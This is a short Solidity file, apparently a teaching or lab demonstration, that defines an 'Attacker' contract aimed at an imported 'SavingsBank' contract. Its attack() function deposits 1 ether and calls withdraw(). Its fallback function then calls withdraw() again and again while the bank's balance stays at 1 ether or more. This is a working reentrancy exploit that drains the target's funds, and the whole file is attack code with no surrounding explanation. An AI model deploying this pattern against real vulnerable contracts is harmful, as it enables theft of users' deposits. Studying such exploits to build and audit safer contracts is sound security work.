// SPDX-License-Identifier: MIT
import "./savingsBank.sol";

contract Attacker {
    SavingsBank public savingsStore;

    constructor(address _savingsStoreAddress) {
        savingsStore = SavingsBank(_savingsStoreAddress);
    }

    // Fallback is called when SavingsBank sends Ether to this
    // contract.
    fallback() external payable {
        if (address(savingsStore).balance >= 1 ether) {
            savingsStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "atleast 1 Ether needs to be sent");
        savingsStore.deposit{value: 1 ether}();
        savingsStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
